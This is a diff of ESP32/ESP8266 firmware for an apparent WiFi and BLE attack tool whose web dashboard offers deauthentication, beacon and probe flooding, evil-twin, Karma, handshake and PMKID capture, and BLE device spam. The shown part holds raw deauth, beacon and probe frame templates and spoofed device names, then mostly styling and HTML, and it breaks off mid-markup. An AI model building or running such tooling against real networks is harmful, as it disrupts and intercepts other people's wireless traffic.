@@ -1,1546 +1,2075 @@
+
 /*
- * WiFi & BLE Security Testing Platform
+ * Advanced WiFi & BLE Security Testing Platform
  * Developed by 0x0806
- * Supports ESP8266 and ESP32 with auto-detection
- * Features: WiFi attacks (2.4/5GHz), BLE attacks, captive portal
+ * ESP32/ESP8266 Compatible - Full Featured
+ * Version: 3.0 - Production Ready
  */
 
-#if defined(ESP32)
-#include <WiFi.h>
-#include <WebServer.h>
-#include <DNSServer.h>
-#include <SPIFFS.h>
-#include <BLEDevice.h>
-#include <BLEServer.h>
-#include <BLEUtils.h>
-#include <BLE2902.h>
-#include <esp_wifi.h>
-#include <esp_bt.h>
-#include <freertos/FreeRTOS.h>
-#include <freertos/task.h>
-#define PLATFORM_ESP32
-#elif defined(ESP8266)
-#include <ESP8266WiFi.h>
-#include <ESP8266WebServer.h>
-#include <DNSServer.h>
-#include <FS.h>
-extern "C" {
-#include "user_interface.h"
-}
-#define PLATFORM_ESP8266
+// Platform Detection and Includes
+#ifdef ESP32
+  #define PLATFORM_ESP32
+  #include <WiFi.h>
+  #include <WebServer.h>
+  #include <DNSServer.h>
+  #include <SPIFFS.h>
+  #include <esp_wifi.h>
+  #include <esp_wifi_types.h>
+  #include <esp_bt.h>
+  #include <esp_bt_main.h>
+  #include <esp_gap_ble_api.h>
+  #include <esp_gatts_api.h>
+  #include <BLEDevice.h>
+  #include <BLEServer.h>
+  #include <BLEUtils.h>
+  #include <BLE2902.h>
+  #include <ArduinoJson.h>
+  #include <nvs_flash.h>
+  #include <esp_task_wdt.h>
 #else
-#error "Unsupported platform! This code requires ESP32 or ESP8266"
+  #define PLATFORM_ESP8266
+  #include <ESP8266WiFi.h>
+  #include <ESP8266WebServer.h>
+  #include <ESP8266mDNS.h>
+  #include <DNSServer.h>
+  #include <FS.h>
+  #include <ArduinoJson.h>
+  extern "C" {
+    #include "user_interface.h"
+    #include "c_types.h"
+  }
+  typedef ESP8266WebServer WebServer;
 #endif
 
-// Configuration
-#define AP_SSID "SecurityTester_0x0806"
-#define AP_PASS "security123"
-#define DNS_PORT 53
-#define WEB_PORT 80
-#define MAX_CLIENTS 32
-#define BEACON_INTERVAL 100
-#define DEAUTH_REASON 7
+// Configuration Constants
+const char* AP_SSID = "SecurityTester_0x0806";
+const char* AP_PASS = "pwned123456";
+const uint8_t AP_CHANNEL = 6;
+const IPAddress AP_IP(192, 168, 4, 1);
+const IPAddress SUBNET(255, 255, 255, 0);
+const IPAddress GATEWAY(192, 168, 4, 1);
 
-// Attack types
-enum AttackType {
-  ATTACK_NONE,
-  ATTACK_DEAUTH,
-  ATTACK_BEACON_SPAM,
-  ATTACK_PROBE_FLOOD,
-  ATTACK_KARMA,
-  ATTACK_EVIL_TWIN,
-  ATTACK_HANDSHAKE_CAPTURE,
-  ATTACK_PMKID_CAPTURE,
-  ATTACK_BLE_SPAM,
-  ATTACK_BLE_BEACON_FLOOD,
-  ATTACK_BLE_SPOOF,
-  ATTACK_DUAL_BAND_SCAN
+// Core Objects
+WebServer server(80);
+DNSServer dnsServer;
+
+// Attack Statistics Structure
+struct AttackStats {
+  uint32_t deauth_sent = 0;
+  uint32_t beacon_sent = 0;
+  uint32_t probe_sent = 0;
+  uint32_t handshakes_captured = 0;
+  uint32_t pmkid_captured = 0;
+  uint32_t ble_spam_sent = 0;
+  uint32_t evil_twin_connections = 0;
+  uint32_t karma_probes = 0;
+  uint32_t packets_monitored = 0;
+  uint32_t clients_connected = 0;
+  unsigned long uptime = 0;
+  float memory_usage = 0;
+  float cpu_usage = 0;
 };
 
-// Global variables
-#ifdef PLATFORM_ESP32
-WebServer server(WEB_PORT);
-#else
-ESP8266WebServer server(WEB_PORT);
-#endif
+// Global State Variables
+AttackStats stats;
+volatile bool attack_running = false;
+volatile bool ap_running = false;
+volatile bool ble_running = false;
+volatile bool monitoring_active = false;
+String selected_network = "";
+String selected_bssid = "";
+uint8_t selected_channel = 1;
+String attack_type = "none";
+unsigned long last_attack_time = 0;
+unsigned long attack_interval = 100;
 
-DNSServer dnsServer;
-AttackType currentAttack = ATTACK_NONE;
-bool attackRunning = false;
-unsigned long attackStartTime = 0;
-unsigned long packetsCount = 0;
-unsigned long blePacketsCount = 0;
-String targetMAC = "";
-String targetSSID = "";
-int targetChannel = 1;
-bool dualBandMode = false;
+// Network Information Structure
+struct NetworkInfo {
+  String ssid;
+  String bssid;
+  int32_t rssi;
+  uint32_t channel;
+  uint8_t encryption;
+  bool hidden;
+  uint32_t last_seen;
+};
 
-// Network lists
-String wifiNetworks = "";
-String bleDevices = "";
-String capturedHandshakes = "";
-String attackStats = "";
+// Data Storage
+std::vector<NetworkInfo> scanned_networks;
+std::vector<String> target_networks;
+std::vector<String> ble_devices;
+std::vector<String> connected_clients;
 
-// BLE variables
+// BLE Configuration
 #ifdef PLATFORM_ESP32
 BLEServer* pServer = nullptr;
-bool bleServerRunning = false;
-std::vector<String> spoofedBLEDevices;
-TaskHandle_t bleAttackTask = nullptr;
-TaskHandle_t wifiAttackTask = nullptr;
+BLECharacteristic* pCharacteristic = nullptr;
+bool ble_device_connected = false;
+uint32_t ble_spam_counter = 0;
+
+// Enhanced BLE Device Names for Spam
+const char* ble_spam_names[] = {
+  "AirPods Pro Max", "Galaxy Buds Pro", "Sony WH-1000XM5", "Beats Studio3",
+  "iPhone 14 Pro", "Samsung S23 Ultra", "MacBook Pro M2", "iPad Pro 12.9",
+  "Apple Watch S8", "Tesla Model S", "Smart TV Samsung", "Gaming Headset",
+  "Wireless Mouse", "Magic Keyboard", "Surface Pro 9", "Dell XPS 13",
+  "HP Spectre x360", "Lenovo ThinkPad", "Google Pixel 7", "OnePlus 11",
+  "Xiaomi Mi 13", "Huawei P60", "Nothing Phone", "Steam Deck",
+  "Nintendo Switch", "PS5 Controller", "Xbox Series X", "VR Headset",
+  "Smart Watch", "Fitness Tracker", "Bluetooth Speaker", "Car Audio"
+};
+const int ble_spam_count = sizeof(ble_spam_names) / sizeof(ble_spam_names[0]);
 #endif
 
-// Deauth packet template
-uint8_t deauthPacket[26] = {
-  0xC0, 0x00,                         // Type/Subtype
-  0x3A, 0x01,                         // Duration
-  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
-  0x00, 0x00,                         // Sequence number
-  DEAUTH_REASON, 0x00                 // Reason code
+// WiFi Packet Templates
+uint8_t deauth_packet_template[26] = {
+  0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x70, 0x6a, 0x01, 0x00
 };
 
-// Beacon frame template
-uint8_t beaconPacket[109] = {
-  0x80, 0x00,                         // Frame Control
-  0x00, 0x00,                         // Duration
-  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
-  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
-  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID
-  0x00, 0x00,                         // Sequence number
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
-  0x64, 0x00,                         // Beacon interval
-  0x31, 0x04,                         // Capability info
-  0x00, 0x00                          // SSID parameter set
+uint8_t beacon_packet_template[128] = {
+  0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04,
+  0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x64, 0x00, 0x01, 0x04
 };
 
-// CSS for modern UI
-const char* CSS_STYLE = R"(
-<style>
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-}
+uint8_t probe_packet_template[64] = {
+  0x40, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0xff, 0xff, 0xff, 0xff,
+  0xff, 0xff, 0x00, 0x00
+};
 
-body {
-  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-  min-height: 100vh;
-  color: #fff;
-  overflow-x: hidden;
-}
-
-.container {
-  max-width: 1200px;
-  margin: 0 auto;
-  padding: 20px;
-}
-
-.header {
-  text-align: center;
-  margin-bottom: 30px;
-  animation: slideDown 0.6s ease-out;
-}
-
-.header h1 {
-  font-size: 2.5rem;
-  margin-bottom: 10px;
-  text-shadow: 0 2px 4px rgba(0,0,0,0.3);
-}
-
-.platform-badge {
-  display: inline-block;
-  background: rgba(255,255,255,0.2);
-  padding: 5px 15px;
-  border-radius: 20px;
-  font-size: 0.9rem;
-  backdrop-filter: blur(10px);
-}
-
-.grid {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-  gap: 20px;
-  margin-bottom: 30px;
-}
-
-.card {
-  background: rgba(255,255,255,0.1);
-  border-radius: 15px;
-  padding: 25px;
-  backdrop-filter: blur(20px);
-  border: 1px solid rgba(255,255,255,0.2);
-  transition: all 0.3s ease;
-  animation: fadeInUp 0.6s ease-out;
-}
-
-.card:hover {
-  transform: translateY(-5px);
-  background: rgba(255,255,255,0.15);
-  box-shadow: 0 15px 35px rgba(0,0,0,0.1);
-}
-
-.card h3 {
-  margin-bottom: 20px;
-  color: #fff;
-  font-size: 1.3rem;
-}
-
-.form-group {
-  margin-bottom: 15px;
-}
-
-label {
-  display: block;
-  margin-bottom: 5px;
-  font-weight: 500;
-}
-
-input, select, textarea {
-  width: 100%;
-  padding: 12px;
-  border: none;
-  border-radius: 8px;
-  background: rgba(255,255,255,0.9);
-  font-size: 14px;
-  transition: all 0.3s ease;
-}
-
-input:focus, select:focus, textarea:focus {
-  outline: none;
-  background: rgba(255,255,255,1);
-  transform: scale(1.02);
-}
-
-.btn {
-  background: linear-gradient(45deg, #ff6b6b, #ee5a52);
-  color: white;
-  padding: 12px 25px;
-  border: none;
-  border-radius: 8px;
-  cursor: pointer;
-  font-size: 14px;
-  font-weight: 600;
-  transition: all 0.3s ease;
-  margin: 5px;
-  text-transform: uppercase;
-  letter-spacing: 0.5px;
-}
-
-.btn:hover {
-  transform: translateY(-2px);
-  box-shadow: 0 8px 25px rgba(255,107,107,0.3);
-}
-
-.btn-success {
-  background: linear-gradient(45deg, #51cf66, #40c057);
-}
-
-.btn-warning {
-  background: linear-gradient(45deg, #ffd43b, #fab005);
-}
-
-.btn-info {
-  background: linear-gradient(45deg, #339af0, #228be6);
-}
-
-.btn-secondary {
-  background: linear-gradient(45deg, #868e96, #6c757d);
-}
-
-.stats-grid {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-  gap: 15px;
-  margin-top: 20px;
-}
-
-.stat-card {
-  background: rgba(255,255,255,0.1);
-  padding: 15px;
-  border-radius: 10px;
-  text-align: center;
-}
-
-.stat-number {
-  font-size: 2rem;
-  font-weight: bold;
-  color: #ffd43b;
-}
-
-.stat-label {
-  font-size: 0.9rem;
-  opacity: 0.8;
-}
-
-.network-list {
-  max-height: 300px;
-  overflow-y: auto;
-  background: rgba(0,0,0,0.2);
-  border-radius: 8px;
-  padding: 10px;
-}
-
-.network-item {
-  background: rgba(255,255,255,0.1);
-  margin: 5px 0;
-  padding: 10px;
-  border-radius: 5px;
-  cursor: pointer;
-  transition: all 0.3s ease;
-}
-
-.network-item:hover {
-  background: rgba(255,255,255,0.2);
-  transform: translateX(5px);
-}
-
-.status {
-  position: fixed;
-  top: 20px;
-  right: 20px;
-  background: rgba(0,0,0,0.8);
-  color: white;
-  padding: 10px 20px;
-  border-radius: 25px;
-  font-weight: bold;
-  z-index: 1000;
-  backdrop-filter: blur(10px);
-}
-
-.status.active {
-  background: linear-gradient(45deg, #51cf66, #40c057);
-  animation: pulse 2s infinite;
-}
-
-@keyframes slideDown {
-  from { transform: translateY(-50px); opacity: 0; }
-  to { transform: translateY(0); opacity: 1; }
-}
-
-@keyframes fadeInUp {
-  from { transform: translateY(30px); opacity: 0; }
-  to { transform: translateY(0); opacity: 1; }
-}
-
-@keyframes pulse {
-  0%, 100% { opacity: 1; }
-  50% { opacity: 0.7; }
-}
-
-@media (max-width: 768px) {
-  .container { padding: 10px; }
-  .header h1 { font-size: 2rem; }
-  .grid { grid-template-columns: 1fr; }
-  .stats-grid { grid-template-columns: repeat(2, 1fr); }
-}
-
-.log-container {
-  background: rgba(0,0,0,0.3);
-  border-radius: 8px;
-  padding: 15px;
-  font-family: 'Courier New', monospace;
-  font-size: 12px;
-  max-height: 200px;
-  overflow-y: auto;
-}
-
-.progress-bar {
-  background: rgba(255,255,255,0.2);
-  height: 8px;
-  border-radius: 4px;
-  overflow: hidden;
-  margin: 10px 0;
-}
-
-.progress-fill {
-  background: linear-gradient(45deg, #51cf66, #40c057);
-  height: 100%;
-  width: 0%;
-  transition: width 0.3s ease;
-}
-</style>
-)";
-
-// HTML Templates
-const char* HTML_HEADER = R"(
-<!DOCTYPE html>
+// HTML Content stored in PROGMEM to save RAM
+const char captive_portal_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WiFi & BLE Security Tester - 0x0806</title>
-)";
-
-const char* HTML_FOOTER = R"(
-<script>
-function updateStats() {
-    fetch('/stats').then(r => r.json()).then(data => {
-        document.getElementById('packetsCount').textContent = data.packets;
-        document.getElementById('blePacketsCount').textContent = data.blePackets;
-        document.getElementById('uptime').textContent = data.uptime;
-        document.getElementById('attackTime').textContent = data.attackTime;
-
-        const status = document.querySelector('.status');
-        if (data.attackRunning) {
-            status.textContent = 'Attack Active: ' + data.attackType;
-            status.classList.add('active');
-        } else {
-            status.textContent = 'Standby';
-            status.classList.remove('active');
+    <title>SecurityTester 0x0806 - Professional Platform</title>
+    <style>
+        :root {
+            --primary-color: #e94560;
+            --secondary-color: #00d4aa;
+            --dark-bg: #0f0f23;
+            --dark-card: #1a1a2e;
+            --darker-card: #16213e;
+            --text-primary: #ffffff;
+            --text-secondary: #b8b8b8;
+            --border-color: #333;
+            --success-color: #00ff88;
+            --warning-color: #ffaa00;
+            --error-color: #ff3366;
+            --gradient-primary: linear-gradient(135deg, #e94560 0%, #0f3460 100%);
+            --gradient-secondary: linear-gradient(135deg, #00d4aa 0%, #007b5e 100%);
+            --box-shadow: 0 8px 32px rgba(233, 69, 96, 0.3);
+            --border-radius: 12px;
         }
-    });
-}
 
-function selectNetwork(ssid, mac, channel) {
-    document.getElementById('targetSSID').value = ssid;
-    document.getElementById('targetMAC').value = mac;
-    document.getElementById('targetChannel').value = channel;
-}
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-function selectBLEDevice(name, mac) {
-    document.getElementById('bleTargetName').value = name;
-    document.getElementById('bleTargetMAC').value = mac;
-}
+        body {
+            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--dark-bg);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
 
-setInterval(updateStats, 1000);
-updateStats();
-</script>
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.05;
+        }
+
+        .header {
+            background: rgba(15, 15, 35, 0.95);
+            backdrop-filter: blur(20px);
+            border-bottom: 2px solid var(--primary-color);
+            padding: 1.5rem 2rem;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: var(--box-shadow);
+        }
+
+        .header-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .logo {
+            font-size: 2.2rem;
+            font-weight: 700;
+            background: var(--gradient-secondary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px var(--secondary-color);
+            animation: logoGlow 3s ease-in-out infinite alternate;
+        }
+
+        @keyframes logoGlow {
+            from { filter: drop-shadow(0 0 10px var(--secondary-color)); }
+            to { filter: drop-shadow(0 0 20px var(--secondary-color)); }
+        }
+
+        .header-stats {
+            display: flex;
+            gap: 2rem;
+            align-items: center;
+        }
+
+        .stat-chip {
+            background: rgba(233, 69, 96, 0.2);
+            border: 1px solid var(--primary-color);
+            border-radius: 20px;
+            padding: 0.5rem 1rem;
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .card {
+            background: rgba(26, 26, 46, 0.9);
+            border: 1px solid var(--border-color);
+            border-radius: var(--border-radius);
+            padding: 2rem;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: var(--gradient-primary);
+            transform: scaleX(0);
+            transition: transform 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 20px 40px rgba(233, 69, 96, 0.4);
+            border-color: var(--secondary-color);
+        }
+
+        .card:hover::before {
+            transform: scaleX(1);
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .card-title {
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: var(--secondary-color);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .card-badge {
+            background: var(--gradient-primary);
+            color: white;
+            padding: 0.3rem 0.8rem;
+            border-radius: 15px;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        .btn {
+            background: var(--gradient-primary);
+            border: none;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin: 0.5rem 0;
+            position: relative;
+            overflow: hidden;
+            min-height: 48px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px rgba(233, 69, 96, 0.4);
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        .btn.success {
+            background: var(--gradient-secondary);
+        }
+
+        .btn.danger {
+            background: linear-gradient(135deg, var(--error-color) 0%, #8b0000 100%);
+        }
+
+        .btn.warning {
+            background: linear-gradient(135deg, var(--warning-color) 0%, #cc7700 100%);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .input-group {
+            margin: 1rem 0;
+        }
+
+        .input-group label {
+            display: block;
+            color: var(--secondary-color);
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .input-group input,
+        .input-group select {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid var(--border-color);
+            border-radius: 8px;
+            background: rgba(15, 15, 35, 0.8);
+            color: var(--text-primary);
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .input-group input:focus,
+        .input-group select:focus {
+            outline: none;
+            border-color: var(--secondary-color);
+            box-shadow: 0 0 15px rgba(0, 212, 170, 0.3);
+        }
+
+        .network-list {
+            max-height: 350px;
+            overflow-y: auto;
+            margin-top: 1rem;
+        }
+
+        .network-item {
+            padding: 1rem;
+            margin: 0.5rem 0;
+            background: rgba(15, 15, 35, 0.6);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .network-item:hover {
+            background: rgba(233, 69, 96, 0.2);
+            border-color: var(--primary-color);
+            transform: translateX(5px);
+        }
+
+        .network-item.selected {
+            background: rgba(0, 212, 170, 0.2);
+            border-color: var(--secondary-color);
+            box-shadow: 0 0 15px rgba(0, 212, 170, 0.3);
+        }
+
+        .network-ssid {
+            font-weight: 600;
+            font-size: 1.1rem;
+            margin-bottom: 0.3rem;
+        }
+
+        .network-details {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+
+        .signal-strength {
+            display: flex;
+            align-items: center;
+            gap: 0.3rem;
+        }
+
+        .signal-bars {
+            display: flex;
+            gap: 1px;
+            align-items: end;
+        }
+
+        .signal-bar {
+            width: 3px;
+            background: var(--text-secondary);
+            border-radius: 1px;
+        }
+
+        .signal-bar.active {
+            background: var(--success-color);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .stat-item {
+            text-align: center;
+            padding: 1.5rem 1rem;
+            background: rgba(15, 15, 35, 0.6);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            transition: all 0.3s ease;
+        }
+
+        .stat-item:hover {
+            background: rgba(233, 69, 96, 0.1);
+            border-color: var(--primary-color);
+        }
+
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--secondary-color);
+            margin-bottom: 0.5rem;
+            font-family: 'Courier New', monospace;
+        }
+
+        .stat-label {
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .status-indicator {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem;
+            margin: 0.5rem 0;
+            background: rgba(15, 15, 35, 0.6);
+            border: 1px solid var(--border-color);
+            border-left: 4px solid var(--primary-color);
+            border-radius: 8px;
+            transition: all 0.3s ease;
+        }
+
+        .status-indicator.active {
+            border-left-color: var(--success-color);
+            background: rgba(0, 255, 136, 0.05);
+        }
+
+        .status-indicator.warning {
+            border-left-color: var(--warning-color);
+            background: rgba(255, 170, 0, 0.05);
+        }
+
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: var(--primary-color);
+            animation: pulse 2s infinite;
+        }
+
+        .status-dot.active {
+            background: var(--success-color);
+        }
+
+        .status-dot.warning {
+            background: var(--warning-color);
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .log-container {
+            background: rgba(15, 15, 35, 0.9);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1rem;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: 'SF Mono', 'Monaco', 'Inconsolata', 'Roboto Mono', monospace;
+            font-size: 0.85rem;
+            line-height: 1.4;
+        }
+
+        .log-entry {
+            margin: 0.3rem 0;
+            padding: 0.2rem 0;
+            color: var(--secondary-color);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .log-entry:last-child {
+            border-bottom: none;
+        }
+
+        .log-entry.error {
+            color: var(--error-color);
+        }
+
+        .log-entry.warning {
+            color: var(--warning-color);
+        }
+
+        .log-entry.success {
+            color: var(--success-color);
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--secondary-color);
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 1rem 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--gradient-primary);
+            width: 0%;
+            transition: width 0.3s ease;
+            animation: progressGlow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes progressGlow {
+            from { box-shadow: 0 0 5px var(--primary-color); }
+            to { box-shadow: 0 0 15px var(--primary-color); }
+        }
+
+        .footer {
+            background: rgba(15, 15, 35, 0.95);
+            border-top: 1px solid var(--border-color);
+            padding: 2rem;
+            text-align: center;
+            color: var(--text-secondary);
+            margin-top: 3rem;
+        }
+
+        .footer-content {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+        }
+
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 2rem;
+        }
+
+        @media (max-width: 1200px) {
+            .grid-3 {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+            
+            .dashboard-grid,
+            .grid-2,
+            .grid-3 {
+                grid-template-columns: 1fr;
+            }
+            
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .header-stats {
+                justify-content: center;
+                flex-wrap: wrap;
+            }
+            
+            .logo {
+                font-size: 1.8rem;
+            }
+            
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 1rem;
+            }
+            
+            .stats-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .attack-controls {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 1rem;
+            margin: 1rem 0;
+        }
+
+        .toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--dark-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1rem 1.5rem;
+            color: var(--text-primary);
+            z-index: 3000;
+            transform: translateX(400px);
+            transition: transform 0.3s ease;
+            max-width: 300px;
+        }
+
+        .toast.show {
+            transform: translateX(0);
+        }
+
+        .toast.success {
+            border-left: 4px solid var(--success-color);
+        }
+
+        .toast.error {
+            border-left: 4px solid var(--error-color);
+        }
+
+        .toast.warning {
+            border-left: 4px solid var(--warning-color);
+        }
+    </style>
+</head>
+<body>
+    <div class="matrix-bg" id="matrix-canvas"></div>
+    
+    <div class="header">
+        <div class="header-content">
+            <div>
+                <div class="logo">SecurityTester 0x0806</div>
+                <div style="font-size: 0.9rem; opacity: 0.8; margin-top: 0.3rem;">
+                    Advanced WiFi & BLE Security Platform
+                </div>
+            </div>
+            <div class="header-stats">
+                <div class="stat-chip">
+                    <span id="platform-info">Platform: Loading...</span>
+                </div>
+                <div class="stat-chip">
+                    <span id="uptime-display">Uptime: 00:00:00</span>
+                </div>
+                <div class="stat-chip">
+                    <span id="memory-usage">RAM: 0%</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="dashboard-grid">
+            <div class="card">
+                <div class="card-header">
+                    <h3 class="card-title">Network Scanner</h3>
+                    <span class="card-badge" id="scan-badge">Ready</span>
+                </div>
+                <div class="attack-controls">
+                    <button class="btn success" onclick="scanNetworks()" id="scan-btn">
+                        <span id="scan-text">Scan Networks</span>
+                        <div id="scan-loading" class="loading-spinner" style="display: none;"></div>
+                    </button>
+                    <button class="btn" onclick="scanBLE()" id="ble-scan-btn">
+                        <span>Scan BLE</span>
+                    </button>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="scan-progress"></div>
+                </div>
+                <div class="network-list" id="network-list">
+                    <div style="text-align: center; padding: 2rem; color: var(--text-secondary);">
+                        Click "Scan Networks" to discover targets
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h3 class="card-title">Attack Controls</h3>
+                    <span class="card-badge" id="attack-badge">Standby</span>
+                </div>
+                <div class="input-group">
+                    <label for="attack-type">Attack Vector</label>
+                    <select id="attack-type">
+                        <option value="deauth">Deauthentication Attack</option>
+                        <option value="beacon">Beacon Flood</option>
+                        <option value="probe">Probe Request Spam</option>
+                        <option value="evil_twin">Evil Twin AP</option>
+                        <option value="karma">Karma Attack</option>
+                        <option value="handshake">Handshake Capture</option>
+                        <option value="pmkid">PMKID Capture</option>
+                        <option value="monitor">Packet Monitor</option>
+                        <option value="ble_spam">BLE Device Spam</option>
+                        <option value="ble_flood">BLE Beacon Flood</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label for="attack-intensity">Attack Intensity</label>
+                    <select id="attack-intensity">
+                        <option value="low">Low (100ms interval)</option>
+                        <option value="medium" selected>Medium (50ms interval)</option>
+                        <option value="high">High (10ms interval)</option>
+                        <option value="extreme">Extreme (1ms interval)</option>
+                    </select>
+                </div>
+                <div class="attack-controls">
+                    <button class="btn danger" onclick="startAttack()" id="attack-start-btn">
+                        Launch Attack
+                    </button>
+                    <button class="btn" onclick="stopAttack()" id="attack-stop-btn">
+                        Stop Attack
+                    </button>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="attack-progress"></div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
